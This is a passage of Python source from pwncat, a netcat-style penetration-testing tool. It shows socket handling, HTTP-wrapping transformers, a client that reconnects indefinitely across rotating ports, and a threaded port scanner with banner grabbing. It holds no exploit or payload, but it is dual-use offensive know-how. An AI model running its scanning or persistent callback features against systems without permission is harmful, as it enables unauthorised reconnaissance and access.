                self.__active = {
                    "af": family,
                    "conn": conns[family]["conn"],
                    "remote_addr": conns[family]["remote_addr"],
                    "remote_port": conns[family]["remote_port"],
                }
                for info in self.__sock.get_sock_opts(self.__active["conn"], self.__options.info):
                    self.__log.info("[%s] %s", self.__sock.get_family_name(family), info)
        self.__conns = conns
        return True

    def re_accept_client(self):
        # type: () -> bool
        """Re-accept new clients, if connection is somehow closed or accept did not work.

        Returns:
            bool: Returns `True` on success and `False` and error.
        """
        # [1/3] Close and remove all previous conn sockets
        self.close_conn_sock()
        for family in self.__conns:
            if "conn" in self.__conns[family]:
                del self.__conns[family]["conn"]

        # [2/3] Accept
        try:
            conn, client = self.__sock.accept(
                [self.__conns[family]["sock"] for family in self.__conns], self.__ssig.has_sock_quit
            )
        except socket.error:
            return False
        self.__conns[conn.family]["conn"] = conn
        self.__conns[conn.family]["remote_addr"] = client[0]
        self.__conns[conn.family]["remote_port"] = client[1]

        # Update active connection socket
        self.__active = {
            "af": conn.family,
            "conn": conn,
            "remote_addr": client[0],
            "remote_port": client[1],
        }
        return True

    def close_bind_sock(self):
        # type: () -> None
        """Close the bind socket used by the server to accept clients."""
        for family in self.__conns:
            if "sock" in self.__conns[family]:
                self.__sock.close(self.__conns[family]["sock"], "sock")

    def close_conn_sock(self):
        # type: () -> None
        """Close the communication socket used for send and receive."""
        for family in self.__conns:
            if "conn" in self.__conns[family]:
                self.__sock.close(self.__conns[family]["conn"], "conn")


# #################################################################################################
# #################################################################################################
# ###
# ###   5 / 11   T R A N S F O R M E R
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [5/11 TRANSFORM]: (1/5): Transform
# -------------------------------------------------------------------------------------------------
class Transform(ABC):  # type: ignore
    """Abstract class to for pwncat I/O transformers.

    This is a skeleton that defines how the transformer for pwncat should look like.
    """

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def log(self):
        # type: () -> logging.Logger
        """`TraceLogger`: Logger instance."""
        return self.__log

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    @abstractmethod
    def __init__(self):
        # type: () -> None
        """Set specific options for this transformer."""
        super(Transform, self).__init__()
        self.__log = logging.getLogger(__name__)

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    @abstractmethod
    def transform(self, data):
        # type: (bytes) -> bytes
        """Implement a transformer function which transforms a string..

        Args:
            data (bytes): data to be transformed.

        Returns:
            bytes: The transformed string.
        """


# -------------------------------------------------------------------------------------------------
# [5/11 TRANSFORM]: (2/5) TransformLinefeed
# -------------------------------------------------------------------------------------------------
class TransformLinefeed(Transform):
    """Implement basic linefeed replacement."""

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, opts):
        # type: (DsTransformLinefeed) -> None
        """Set specific options for this transformer.

        Args:
            opts (DsTransformLinefeed): Transformer options.

        """
        super(TransformLinefeed, self).__init__()
        self.__opts = opts

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def transform(self, data):
        # type: (bytes) -> bytes
        """Transform linefeeds to CRLF, LF or CR if requested.

        Returns:
            str: The string with altered linefeeds.
        """
        # 'auto' keep it as it is
        if self.__opts.crlf is None:
            return data

        # ? -> No line feeds
        if self.__opts.crlf == "no":
            if data[-2:] == StringEncoder.encode("\r\n"):
                self.log.debug("Removing CRLF")
                return data[:-2]
            if data[-1:] == StringEncoder.encode("\n"):
                self.log.debug("Removing LF")
                return data[:-1]
            if data[-1:] == StringEncoder.encode("\r"):
                self.log.debug("Removing CR")
                return data[:-1]
        # ? -> CRLF
        if self.__opts.crlf == "crlf" and data[-2:] != StringEncoder.encode("\r\n"):
            if data[-1:] == StringEncoder.encode("\n"):
                self.log.debug("Replacing LF with CRLF")
                return data[:-1] + StringEncoder.encode("\r\n")
            if data[-1:] == StringEncoder.encode("\r"):
                self.log.debug("Replacing CR with CRLF")
                return data[:-1] + StringEncoder.encode("\r\n")
        # ? -> LF
        if self.__opts.crlf == "lf":
            if data[-2:] == StringEncoder.encode("\r\n"):
                self.log.debug("Replacing CRLF with LF")
                return data[:-2] + StringEncoder.encode("\n")
            if data[-1:] == StringEncoder.encode("\r"):
                self.log.debug("Replacing CR with LF")
                return data[:-1] + StringEncoder.encode("\n")
        # ? -> CR
        if self.__opts.crlf == "cr":
            if data[-2:] == StringEncoder.encode("\r\n"):
                self.log.debug("Replacing CRLF with CR")
                return data[:-2] + StringEncoder.encode("\r")
            if data[-1:] == StringEncoder.encode("\n"):
                self.log.debug("Replacing LF with CR")
                return data[:-1] + StringEncoder.encode("\r")

        # Otherwise just return it as it is
        return data


# -------------------------------------------------------------------------------------------------
# [5/11 TRANSFORM]: (3/5) TransformSafeword
# -------------------------------------------------------------------------------------------------
class TransformSafeword(Transform):
    """Implement a trigger to emergency shutdown upon receival of a specific safeword."""

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, opts):
        # type: (DsTransformSafeword) -> None
        """Set specific options for this transformer.

        Args:
            opts (DsTransformLinefeed): Transformer options.

        """
        super(TransformSafeword, self).__init__()
        self.__opts = opts
        self.__log = logging.getLogger(__name__)

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def transform(self, data):
        # type: (bytes) -> bytes
        """Raise a stop signal upon receiving the safeword.

        Returns:
            str: The string as it is without changes
        """
        if StringEncoder.encode(self.__opts.safeword) in data:
            self.log.trace("TERMINATE signal RAISED in TransformSafeword.transform")  # type: ignore
            self.__opts.ssig.raise_terminate()
        return data


# -------------------------------------------------------------------------------------------------
# [5/11 TRANSFORM]: (4/5) TransformHttpPack
# -------------------------------------------------------------------------------------------------
class TransformHttpPack(Transform):
    """Implement a transformation to pack data into HTTP packets."""

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, opts):
        # type: (Dict[str, str]) -> None
        """Set specific options for this transformer.

        Args:
            opts (DsTransformLinefeed): Transformer options.

        """
        super(TransformHttpPack, self).__init__()
        self.__opts = opts
        self.__log = logging.getLogger(__name__)

        assert "reply" in opts
        assert opts["reply"] in ["request", "response"]

        # Initial default header
        self.__headers = [
            "Accept-Charset: utf-8",
        ]

        self.__response_headers_sent = False

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def transform(self, data):
        # type: (bytes) -> bytes
        """Wrap data into a HTTP packet.

        Returns:
            bytes: The wrapped string.
        """
        request_header = [
            "POST / HTTP/1.1",
            "Host: {}".format(self.__opts["host"]),
            "User-Agent: pwncat",
            "Accept: */*",
            "Conent-Length: {}".format(len(data)),
            "Content-Type: text/plain; charset=UTF-8",
        ]
        response_header = [
            "HTTP/1.1 200 OK",
            "Date: {}".format(self.__get_date()),
            "Server: pwncat",
            "Conent-Length: {}".format(len(data)),
            "Connection: close",
        ]

        self.__response_headers_sent = True

        if self.__opts["reply"] == "request":
            header = StringEncoder.encode(
                "\n".join(request_header) + "\n" + "\n".join(self.__headers) + "\n\n"
            )
        else:
            header = StringEncoder.encode(
                "\n".join(response_header) + "\n" + "\n".join(self.__headers) + "\n\n"
            )
        return header + data

    # --------------------------------------------------------------------------
    # Private Functions
    # --------------------------------------------------------------------------
    def __get_date(self):  # pylint: disable=no-self-use
        # type: () -> str
        now = datetime.utcnow()
        weekday = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"][now.weekday()]
        month = [
            "Jan",
            "Feb",
            "Mar",
            "Apr",
            "May",
            "Jun",
            "Jul",
            "Aug",
            "Sep",
            "Oct",
            "Nov",
            "Dec",
        ][now.month - 1]
        return "%s, %02d %s %04d %02d:%02d:%02d GMT" % (
            weekday,
            now.day,
            month,
            now.year,
            now.hour,
            now.minute,
            now.second,
        )


# -------------------------------------------------------------------------------------------------
# [5/11 TRANSFORM]: (5/5) TransformHttpUnpack
# -------------------------------------------------------------------------------------------------
class TransformHttpUnpack(Transform):
    """Implement a transformation to unpack data from HTTP packets."""

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, opts):
        # type: (Dict[str, str]) -> None
        """Set specific options for this transformer.

        Args:
            opts (DsTransformLinefeed): Transformer options.

        """
        super(TransformHttpUnpack, self).__init__()
        self.__opts = opts
        self.__log = logging.getLogger(__name__)

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def transform(self, data):
        # type: (bytes) -> bytes
        """Unwrap data from a HTTP packet.

        Returns:
            str: The wrapped string.
        """
        request = StringEncoder.encode(r"^(GET|HEAD|POST|PUT|DELETE|CONNECT|OPTIONS|TRACE|PATCH)")
        response = StringEncoder.encode(r"^HTTP/[.0-9]+")

        # Did not receive a valid HTTP request, so we return the original untransformed message
        if not (re.match(request, data) or re.match(response, data)):
            return data

        body = StringEncoder.encode(r"(\r\n\r\n|\n\n)(.*)")
        match = re.search(body, data)

        # Check if we can separate headers and body
        if match is None or len(match.group()) < 2:
            return data
        return match.group(2)


# #################################################################################################
# #################################################################################################
# ###
# ###   6 / 11   I O   M O D U L E S
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [6/11 IO]: (1/5): IO
# -------------------------------------------------------------------------------------------------
class IO(ABC):  # type: ignore
    """Abstract class to for pwncat I/O modules.

    This is a skeleton that defines how the I/O module for pwncat should look like.

    The "producer" should constantly yield data received from some sort of input
    which could be user input, output from a shell command data from a socket.

    The "callback" will apply some sort of action on the data received from a producer
    which could be output to stdout, send it to the shell or to a socket.

    "The "interrupts" are a list of funtions that trigger the producer to stop
    and return to its parent thread/function. The producer must also be implemented
    in a way that it is able to act on the event which the "interrupt" func emitted.
    """

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def ssig(self):
        # type: () -> InterruptHandler
        """`InterruptHandler`: InterruptHandler instance."""
        return self.__ssig

    @property
    def log(self):
        # type: () -> logging.Logger
        """`TraceLogger`: Logger instance."""
        return self.__log

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    @abstractmethod
    def __init__(self, ssig):
        # type: (InterruptHandler) -> None
        """Set specific options for this IO module.

        Args:
            ssig (InterruptHandler): InterruptHandler instance used by the interrupter.
        """
        super(IO, self).__init__()
        self.__ssig = ssig
        self.__log = logging.getLogger(__name__)

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    @abstractmethod
    def producer(self, *args, **kwargs):
        # type: (Any, Any) -> Iterator[bytes]
        """Implement a generator function which constantly yields data.

        The data could be from various sources such as: received from a socket,
        received from user input, received from shell command output or anything else.

        Yields:
            str: Data generated/produced by this function.
        """

    @abstractmethod
    def consumer(self, data):
        # type: (bytes) -> None
        """Define a consumer callback which will apply an action on the producer output.

        Args:
            data (str): Data retrieved from the producer to work on.
        """

    @abstractmethod
    def interrupt(self):
        # type: () -> None
        """Define an interrupt function which will stop the producer.

        Various producer might call blocking functions and they won't be able to stop themself
        as they hang on that blocking function.
        NOTE: This method is triggered from outside and is supposed to stop/shutdown the producer.
        """


# -------------------------------------------------------------------------------------------------
# [6/11 IONetwork]: (2/5) IONetwork
# -------------------------------------------------------------------------------------------------
class IONetwork(IO):
    """Pwncat implementation based on custom Socket library."""

    @property
    def net(self):
        # type: () -> Net
        """Returns instance of Net."""
        return self.__net

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(
            self,
            ssig,  # type: InterruptHandler
            encoder,  # type: StringEncoder
            host,  # type: str
            ports,  # type: List[int]
            role,  # type: str
            srv_opts,  # type: DsIONetworkSrv
            cli_opts,  # type: DsIONetworkCli
            sock_opts,  # type: DsIONetworkSock
    ):
        # type: (...) -> None
        """Create a Pwncat instance of either a server or a client.

        Args:
            ssig (InterruptHandler): Instance of InterruptHandler.
            encoder (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
            host (str): The hostname to resolve.
            ports ([int]): List of ports to connect to or listen on.
            role (str): Either "server" or "client".
            srv_opts (DsIONetworkSrv):   Options for the server.
            cli_opts (DsIONetworkCli):   Options for the client.
            sock_opts (DsIONetworkSock): Options to parse back to Sock.
        """
        assert role in ["server", "client"], "The role must be 'server' or 'client'."
        super(IONetwork, self).__init__(ssig)

        self.__role = role
        self.__net = Net(encoder, ssig, sock_opts)
        self.__sock_opts = sock_opts
        self.__srv_opts = srv_opts
        self.__cli_opts = cli_opts

        # Did we already run cleanup
        self.__cleaned_up = False

        # Internally store addresses for reconn or rebind functions
        self.__host = host
        self.__ports = ports
        self.__pport = 0  # pointer to the current port

        if role == "server":
            if not self.__net.run_server(self.__host, self.__ports[self.__pport]):
                if not self.__server_rebind():
                    sys.exit(1)
        if role == "client":
            if not self.__net.run_client(self.__host, self.__ports[self.__pport]):
                if not self.__client_reconnect_to_server():
                    sys.exit(1)

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def producer(self, *args, **kwargs):
        # type: (Any, Any) -> Iterator[bytes]
        """Network receive generator which hooks into the receive function and adds features.

        Yields:
            str: Data received from a connected socket.
        """
        # Counter for receive retries once this side of the program
        # shuts down (e.g.: Ctrl+c) as there could be data left on the wire.
        curr_recv_timeout_retry = 0

        # Loop endlessly and yield data back to the caller
        while True:
            # [1/3] Generate data
            try:
                yield self.__net.receive()
            # [2/3] Non-blocking socket is finished receiving data and allows us to do some action
            except socket.timeout as err:
                # Check if we close the socket for sending
                if self.ssig.has_sock_send_eof():
                    self.log.trace(  # type: ignore
                        "SOCK-SEND-EOF signal ACK in IONetwork.producer [1]: %s", err
                    )
                    self.__net.send_eof()

                # Let's ask the interrupter() function if we should terminate?
                if not self.ssig.has_sock_quit():
                    continue
                # Stop signal is raied when my own side of the network was closed.
                # Happened most likely that the user pressed Ctrl+c
                # Before quitting, we will check x many times, if there is still
                # data left to receive, before shutting down.
                if curr_recv_timeout_retry < self.__sock_opts.recv_timeout_retry:
                    self.log.trace(  # type: ignore
                        "Final socket read: %d/%d before quitting.",
                        curr_recv_timeout_retry + 1,
                        self.__sock_opts.recv_timeout_retry,
                    )
                    curr_recv_timeout_retry += 1
                    continue
                # We ware all done reading, shut down
                self.log.trace(  # type: ignore
                    "SOCK-QUIT signal ACK in IONetwork.producer [1]: %s", err
                )
                self.__cleanup()
                return
            # [3/3] Connection was closed remotely (EOF) or locally (Ctrl+C or similar)
            except (EOFError, AttributeError, socket.error) as err:
                # Do we have a stop signal?
                if self.ssig.has_sock_quit():
                    self.log.trace(  # type: ignore
                        "SOCK-QUIT signal ACK in IONetwork.producer [2]: %s", err
                    )
                    self.__cleanup()
                    return
                # Do we re-accept new clients?
                if self.__sock_opts.udp:
                    # Always accept new clients or reconnect in UDP mode (its stateless)
                    continue
                if self.__role == "server" and self.__server_reaccept_from_client():
                    continue
                if self.__role == "client" and self.__client_reconnect_to_server():
                    continue
                # Inform everybody that we are quitting
                self.log.trace("SOCK-EOF signal RAISE in IONetwork.producer")  # type: ignore
                self.ssig.raise_sock_eof()

    def consumer(self, data):
        # type: (bytes) -> None
        """Send data to a socket."""
        try:
            self.__net.send(data)
        except socket.error:
            pass

    def interrupt(self):
        # type: () -> None
        """Stop function that can be called externally to close this instance."""
        self.log.trace("SOCK-QUIT signal RAISE in IONetwork.interrupt")  # type: ignore
        self.ssig.raise_sock_quit()
        self.__cleanup()

    # --------------------------------------------------------------------------
    # Private Functions
    # --------------------------------------------------------------------------
    def __cleanup(self):
        # type: () -> None
        """Cleanup function."""
        if not self.__cleaned_up:
            self.log.trace("SOCK-QUIT-CLEANUP: Closing sockets")  # type: ignore
            self.__net.close_conn_sock()
            self.__net.close_bind_sock()
            self.__cleaned_up = True

    def __client_reconnect_to_server(self):
        # type: () -> bool
        """Ensure the client re-connects to the remote server, if the remote server hang up.

        Returns:
            bool: Returns `True` on success and `False` on failure or stop signal requested.
        """
        assert self.__role == "client", "This should have been caught during arg check."

        # reconn < 0 (endlessly)
        # reconn > 0 (reconnect until counter reaches zero)
        while self.__cli_opts.reconn != 0:
            # [1/6] Let's ask the interrupter() function if we should terminate?
            # We need a little wait here in order for the stop signal to propagate.
            # Don't know how fast the other threads are.
            if self.ssig.has_sock_quit():
                self.log.trace(  # type: ignore
                    "SOCK-QUIT signal ACK in IONetwork.__clienet_reconnect_to_server [1]"
                )
                return False

            # [2/6] Wait
            time.sleep(self.__cli_opts.reconn_wait)

            # [3/6] Let's ask the interrupter() function if we should terminate?
            # In case the other threads were slower as the sleep time in [1/5]
            # we will check again here.
            if self.ssig.has_sock_quit():
                self.log.trace(  # type: ignore
                    "SOCK-QUIT signal ACK in IONetwork.__clienet_reconnect_to_server [2]"
                )
                return False

            # [4/6] Increment the port numer (if --reconn-robin has multiple)
            self.__pport += 1
            if self.__pport == len(self.__ports):
                self.__pport = 0

            if self.__cli_opts.reconn > 0:
                self.log.info(
                    "Reconnecting to %s:%d in %.1f sec (%d more times left)",
                    self.__host,
                    self.__ports[self.__pport],
                    self.__cli_opts.reconn_wait,
                    self.__cli_opts.reconn,
                )
            else:
                self.log.info(
                    "Reconnecting to %s:%d in %.1f sec (indefinitely)",
                    self.__host,
                    self.__ports[self.__pport],
                    self.__cli_opts.reconn_wait,
                )

            # [5/6] Decrease reconnect counter
            if self.__cli_opts.reconn > 0:
                self.__cli_opts.reconn -= 1

            # [6/6] Recurse until True or reconnect count is used up
            if self.__net.run_client(self.__host, self.__ports[self.__pport]):
                return True

        # [5/5] Signal failure
        self.log.info("Reconnect count is used up. Shutting down.")
        return False

    def __server_rebind(self):
        # type: () -> bool

        # rebind < 0 (endlessly)
        # rebind > 0 (rebind until counter reaches zero)
        while self.__srv_opts.rebind != 0:

            # [1/7] Let's ask the interrupter() function if we should terminate?
            if self.ssig.has_sock_quit():
                self.log.trace(  # type: ignore
                    "SOCK-QUIT signal ACK in IONetwork.__server_rebind [1]"
                )
                return False

            # [2/7] Increment the port numer (if --reconn-robin has multiple)
            self.__pport += 1
            if self.__pport == len(self.__ports):
                self.__pport = 0

            # [3/7] Notify user
            if self.__srv_opts.rebind > 0:
                self.log.info(
                    "Rebinding to port %d in %.1f sec (%d more times left)",
                    self.__ports[self.__pport],
                    self.__srv_opts.rebind_wait,
                    self.__srv_opts.rebind,
                )
            else:
                self.log.info(
                    "Rebinding to port %d in %.1f sec (indefinitely)",
                    self.__ports[self.__pport],
                    self.__srv_opts.rebind_wait,
                )

            # [4/7] Decrease reconnect counter
            if self.__srv_opts.rebind > 0:
                self.__srv_opts.rebind -= 1

            # [5/7] Wait (--rebind-wait)
            time.sleep(self.__srv_opts.rebind_wait)

            # [6/7] Let's ask the interrupter() function if we should terminate?
            # In case the other threads were slower as the sleep time in [1/7]
            # we will check again here.
            if self.ssig.has_sock_quit():
                self.log.trace(  # type: ignore
                    "SOCK-QUIT signal ACK in IONetwork.__server_rebind [2]"
                )
                return False

            # [6/7] Recurse until True or reconnect count is used up
            if self.__net.run_server(self.__host, self.__ports[self.__pport]):
                return True

        # [7/7] Nope
        self.log.info("Rebind count is used up. Shutting down.")
        return False

    def __server_reaccept_from_client(self):
        # type: () -> bool
        """Ensure the server is able to keep connection open by re-accepting new clients.

        Returns:
            bool: True on success and False on failure
        """
        # Do not re-accept for UDP
        assert not self.__sock_opts.udp, "This should have been caught during arg check."
        assert self.__role == "server", "This should have been caught during arg check."

        # [NO] Do not re-accept
        if not self.__srv_opts.keep_open:
            self.log.info("No automatic re-accept specified. Shutting down.")
            return False

        # [MAYBE] Check stop signal and otherwise try until success.
        while True:
            time.sleep(0.01)
            # [NO] We have a stop signal
            if self.ssig.has_sock_quit():
                self.log.trace(  # type: ignore
                    "SOCK-QUIT signal ACK in IONetwork.__server_reaccept_from_client"
                )
                return False
            # [YES] Re-accept indefinitely
            self.log.info("Re-accepting new clients")
            if self.__net.re_accept_client():
                return True


# -------------------------------------------------------------------------------------------------
# [6/11 IONetwork]: (3/5) IONetwork
# -------------------------------------------------------------------------------------------------
class IONetworkScanner(IO):
    """Pwncat Scanner implementation based on custom Socket library."""

    BANNER_PAYLOADS = {
        # 0 is for generic ones, which do not have a custom port definition already
        0: [
            None,  # This means to not send anything, but receive first
            "",
            "\0",
            "\r",
            "\n",
            "\r\n",
            "HEAD /\r\n\r\n",
        ],
    }

    # Common regexes
    BANNER_REG = [
        r"Server:\s*(.*)",  # extract webserver from header
        r"(.*[0-9][-.0-9]*.*)",  # generic version string
    ]

    # Compiled versions of common regexes
    BANNER_REG_COMP = []  # type: List[re.Pattern[str]]

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(
            self,
            ssig,  # type: InterruptHandler
            encoder,  # type: StringEncoder
            host,  # type: str
            banner,  # type: bool
            cli_opts,  # type: DsIONetworkCli
            sock_opts,  # type: DsIONetworkSock
    ):
        # type: (...) -> None
        """Create a Pwncat Network Scanner instance.

        Args:
            ssig (InterruptHandler): Instance of InterruptHandler.
            encoder (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
            host (str): The hostname to resolve.
            banner (bool): Determines if we do banner grabbing as well.
            cli_opts (DsIONetworkCli):   Options for the client.
            sock_opts (DsIONetworkSock): Options to parse back to Sock.
        """
        super(IONetworkScanner, self).__init__(ssig)

        self.__ssig = ssig
        self.__enc = encoder
        self.__cli_opts = cli_opts
        self.__sock_opts = sock_opts
        self.__banner = banner

        self.__log = logging.getLogger(__name__)
        self.__sock = Sock()
        self.__screen_lock = threading.Semaphore()

        # Keep track of local binds (addr-port) of the threaded scanner
        # clients as we do not want to treat them as open ports (false posistives)
        self.__local_binds = {}  # type: Dict[str, socket.socket]

        # Compile our regexes if using banner detection
        if banner:
            for reg in self.BANNER_REG:
                self.BANNER_REG_COMP.append(re.compile(reg, re.IGNORECASE))

        # Get numerical IP addresses for IPv4 and/or IPv6
        if self.__sock_opts.ipv6:
            families = [int(socket.AF_INET6)]
        elif self.__sock_opts.ipv4:
            families = [int(socket.AF_INET)]
        else:
            families = [
                int(socket.AF_INET6),
                int(socket.AF_INET),
            ]
        self.__targets = {}
        for family in families:
            try:
                self.__targets[family] = self.__sock.gethostbyname(
                    host, family, not self.__sock_opts.nodns
                )
            except socket.gaierror:
                pass

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def __get_socket(self, family):
        # type: (Union[socket.AddressFamily, int]) -> socket.socket
        """Create socket for specific address family endlessly until resources are available."""
        # The scanner starts one thread for each port to scan. Each thread will also create
        # one socket and we might hit the max_allowed_files limit (ulimit).
        # That's why we loop through creating sockets until we hit a success
        # as in the meantime, other threads might have already released sockets/fd's.
        while True:
            delay = 0.0
            if self.__ssig.has_terminate():
                self.log.trace(  # type: ignore
                    "TERMINATE signal ACK for IONetworkScanner._getsocket"
                )
                raise socket.error("quit")
            try:
                if self.__sock_opts.udp:
                    return self.__sock.create_socket(family, socket.SOCK_DGRAM, False)
                return self.__sock.create_socket(family, socket.SOCK_STREAM, False)
            except socket.error:
                delay += 0.1
                time.sleep(delay)  # This can be bigger to give the system some time to release fd's

    def __get_banner_version(self, banner):
        # type: (str) -> Optional[str]
        """Extract version information from a string."""
        if not banner or banner is None:
            return None

        # If we only have a single line, return it (all we got)
        lines = banner.splitlines()
        if len(lines) == 1:
            return lines[0]

        # Version extraction
        for reg in self.BANNER_REG_COMP:
            match = re.search(reg, banner)
            if match:
                return StringEncoder.rstrip(match.group(1))  # type: ignore

        # Nothing found, return first non-empty line
        for line in lines:
            if line:
                return line

        # Nothing found
        return None

    def __get_banner(self, sock, addr, port):
        # type: (socket.socket, str, int) -> Tuple[bool, Optional[str]]
        """Retrieve the (version) banner from a network service."""
        if port in self.BANNER_PAYLOADS:
            payloads = self.BANNER_PAYLOADS[port] + self.BANNER_PAYLOADS[0]
        else:
            payloads = self.BANNER_PAYLOADS[0]

        for payload in payloads:
            # Break the loop on terminate signal
            if self.__ssig.has_terminate():
                self.log.trace(  # type: ignore
                    "TERMINATE signal ACK for IONetworkScanner._getbanner: %s-%d", addr, port
                )
                return (False, None)
            try:
                if payload is not None:
                    sock.send(self.__enc.encode(payload))
                    self.__log.debug("%s:%d - payload sent: %s", addr, port, repr(payload))

                sock.settimeout(0.5)
                banner = sock.recv(self.__sock_opts.bufsize)
                version = self.__get_banner_version(self.__enc.decode(banner))
                self.__log.debug("%s:%d - respone received: %s", addr, port, repr(banner))
                return (True, version)
            except socket.timeout:
                continue
            except (OSError, socket.error):
                return (False, None)
        return (True, None)

    def producer(self, *args, **kwargs):
        # type: (Any, Any) -> Iterator[bytes]
        """Port scanner yielding open/closed string for given port.

        Args:
            args: additional arguments.
            kwargs: additional arguments.

        Yields:
            str: Open/closed state (optionally with banner) from a port.
        """
        port = args[0]

        # Loop over adress families
        for family in self.__targets:

            # [1/7] Check for termination request
            if self.__ssig.has_terminate():
                self.log.trace("TERMINATE signal ACK for IONetworkScanner.producer")  # type: ignore
                return

            addr = self.__targets[family]

            # [2/7] Get socket
            try:
                sock = self.__get_socket(family)
                sock_type = sock.type
            except (AttributeError, socket.error):
                # Exception is triggered due to stop stignal and we
                # will abort here in that case.
                return

            # [3/7] Connect scan
            try:
                laddr, lport = self.__sock.connect(
                    sock,
                    addr,
                    port,
                    None,
                    None,
                    True,
                    self.__enc.encode("\0"),
                    self.__sock_opts.bufsize,
                    0.1,
                )
                # Append local binds (addr-port) to check against during port scan
                key = str(laddr + "-" + str(lport))
                self.__local_binds[key] = sock
            except socket.error:
                self.__sock.close(sock, "[-] closed: {}:{}".format(addr, port))
                continue

            # [4/7] False positives
            # Connect was successful, but against a local bind of one of our
            # port scanners, so this is a false positive.
            if str(addr + "-" + str(port)) in self.__local_binds:
                self.__sock.close(sock, "[-] closed: {}:{}".format(addr, port))
                del self.__local_binds[key]
                continue

            # [5/7] Banner grabbing
            succ_banner = True
            banner = None
            if self.__banner:
                (succ_banner, banner) = self.__get_banner(sock, addr, port)

            # [6/7] Evaluation
            if banner is not None and succ_banner:
                msg = "[+] {:>5}/{} open   ({}): {}".format(
                    port,
                    self.__sock.get_type_name(sock_type),
                    self.__sock.get_family_name(family),
                    banner,
                )
                yield self.__enc.encode(msg)
            if banner is None and succ_banner:
                msg = "[+] {:>5}/{} open   ({})".format(
                    port,
                    self.__sock.get_type_name(sock_type),
                    self.__sock.get_family_name(family),
                )
                yield self.__enc.encode(msg)

            # [7/7] Cleanup
            self.__sock.close(sock, key)
            del self.__local_binds[key]

    def consumer(self, data):
        # type: (bytes) -> None
        """Print received data to stdout."""
        # For issues with flush (when using tail -F or equal) see links below:
        # https://stackoverflow.com/questions/26692284
        # https://docs.python.org/3/library/signal.html#note-on-sigpipe
        with self.__screen_lock:
            print(StringEncoder.decode(data))
            try:
                sys.stdout.flush()
            except IOError:
                # Python flushes standard streams on exit; redirect remaining output
                # to devnull to avoid another broken pipe at shutdown
                devnull = os.open(os.devnull, os.O_WRONLY)
                os.dup2(devnull, sys.stdout.fileno())

    def interrupt(self):
        # type: () -> None
        """Stop function that can be called externally to close this instance."""
        self.log.trace("SOCK-QUIT signal RAISED in IONetworkScanner.interrupt")  # type: ignore
        self.ssig.raise_sock_quit()

        # NOTE: Closing up to 65535 sockets (single thread) takes very very long
        # Se we leave this up to Python itself, once the program exits.
        # self.log.trace("SOCK-QUIT-CLEANUP: Closing sockets")  # type: ignore
        # # Double loop to prevent: Dictionary size changed during iteration
        # remove = {}
        # for key in self.__local_binds:
        #     remove[key] = self.__local_binds[key]
        # for key in remove:
        #     self.__sock.close(remove[key], key)


# -------------------------------------------------------------------------------------------------
# [6/11 IOStdinStdout]: (4/5) IOStdinStdout
# -------------------------------------------------------------------------------------------------
class IOStdinStdout(IO):
    """Implement basic stdin/stdout I/O module.

    This I/O module provides a generator which continuously reads from stdin
    (non-blocking on POSIX and blocking on Windows) as well as a
    callback that writes to stdout.
    """

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, ssig, opts):
        # type: (InterruptHandler, DsIOStdinStdout) -> None
        """Set specific options for this I/O module.

        Args:
            ssig (InterruptHandler): InterruptHandler instance.
            opts (DsIOStdinStdout): IO options.
        """
        super(IOStdinStdout, self).__init__(ssig)
        self.__opts = opts
        self.__py3 = sys.version_info >= (3, 0)  # type: bool
        self.__win = os.name != "posix"  # posix or nt
        self.__stdout_isatty = sys.stdout.isatty()
        self.__stdin_isatty = sys.stdin.isatty()

        self.log.debug("STDOUT isatty: %s", self.__stdout_isatty)
        self.log.debug("STDIN  isatty: %s", self.__stdin_isatty)
        self.log.debug("STDIN  posix:  %s (%s)", str(self.__win), os.name)

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def producer(self, *args, **kwargs):
        # type: (Any, Any) -> Iterator[bytes]
        """Constantly ask for user input.

        Yields:
            str: Data read from stdin.
        """
        # On --send-on-eof we will return all of its contents at once:
        lines = []

        # https://stackoverflow.com/questions/1450393/#38670261
        # while True: line = sys.stdin.readline() <- reads a whole line (faster)
        # for line in sys.stdin.readlin():        <- reads one byte at a time
        while True:
            if self.ssig.has_stdin_quit():
                self.log.trace(  # type: ignore
                    "STDIN-QUIT signal ACK in IOStdinStdout.producer [1]"
                )
                return
            try:
                data = self.__read_stdin()
            except EOFError:
                # When using select() with timeout, we don't have any input
                # at this point and simply continue the loop or quit if
                # a terminate request has been made by other threads.
                if self.ssig.has_stdin_quit():
                    self.log.trace(  # type: ignore
                        "STDIN-QUIT signal ACK in IOStdinStdout.producer [2]"
                    )
                    return
                continue
            if data:
                self.log.debug("Received %d bytes from STDIN", len(data))
